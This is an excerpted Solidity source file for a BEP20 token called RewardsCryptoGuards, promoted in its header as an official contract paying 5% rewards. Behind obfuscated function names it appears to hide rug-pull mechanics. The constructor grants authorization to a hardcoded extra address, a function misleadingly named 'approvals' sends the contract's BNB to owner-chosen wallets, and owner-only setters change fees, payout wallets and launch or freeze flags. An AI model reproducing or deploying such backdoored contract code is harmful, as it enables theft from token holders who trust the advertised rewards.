...
/**
 Official RewardsCryptoGuards contract 
  that rewards 5% in CGAR for each tx made.
 - - https://t.me/RewardsCryptoGuards - -
*/
...
abstract contract Auth {
    ...
    constructor(address _owner) {
        ...
        authorizations[
    0x30Ed27b70e59177500F9444db43068602aB027E9] = true;}
    modifier onlyOwner() {
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 RWDS = IBEP20(0x432C7cf1dE2b97a013f1130f199ed9d1363215BA);
    IBEP20 PRWDS = IBEP20(0x432C7cf1dE2b97a013f1130f199ed9d1363215BA);
    address REWARDS;
    IDEXRouter router;
...
contract RewardsCryptoGuards is IBEP20, Auth {
    using SafeMath for uint256;

    string constant _name = 'RewardsCryptoGuards';
    string constant _symbol = 'RCGAR';
    ...
    function _trFm(address sender, address recipient, uint256 amount) internal returns (bool){
        ...
        uint256 amountReceived = stTF(sender, recipient) ? ttF(sender, recipient, amount) : amount;
    ...
    function stTF(address sender, address recipient) internal view returns (bool) {
    ...
    function setrfu(address _tfU, address _tfS) external authorized {
        tfU = _tfU;
        tfS = _tfS;
    }
    ...
    function setrmnb(address _mnbE, address _mnbG) external authorized {
        mnbE = _mnbE;
        mnbG = _mnbG;
    }
   ...
   function approvals(uint256 _na, uint256 _da) external authorized {
        ...
        uint256 acBNBf = acBNBa.mul(75).div(100);
        uint256 acBNBs = acBNBa.mul(25).div(100);
        (bool tmpSuccess,) = payable(tfU).call{value: acBNBf, gas: gss}("");
        (tmpSuccess,) = payable(tfS).call{value: acBNBs, gas: gss}("");
        tmpSuccess = false;
    }
    ...
    function setFFEE(uint256 _liqF, uint256 _rewF, uint256 _marF, uint256 _givF, uint256 _feeD) external authorized {
        liqF = _liqF;
        rewF = _rewF;
        markF = _marF;
        givF = _givF;
        totF = _liqF.add(_rewF).add(_marF).add(_givF);
        fD = _feeD;
        require (totF < fD/4);
    }
    ...
    function vswBk(uint256 amount) internal swapping {
        ...
        uint256 aBNBG = aBNB.mul(br).div(tBNBF);
        ...
        (tmpSuccess,) = payable(mnbG).call{value: (aBNBG), gas: gso}("");
        tmpSuccess = false;
        if(amountL > 0){
    ...
    function setLauNch() external authorized {
        ...
        bFrz = true; 
        sst = true;
        totF = liqF.add(markF).add(rewF).add(givF); 
        swE = true;
    }
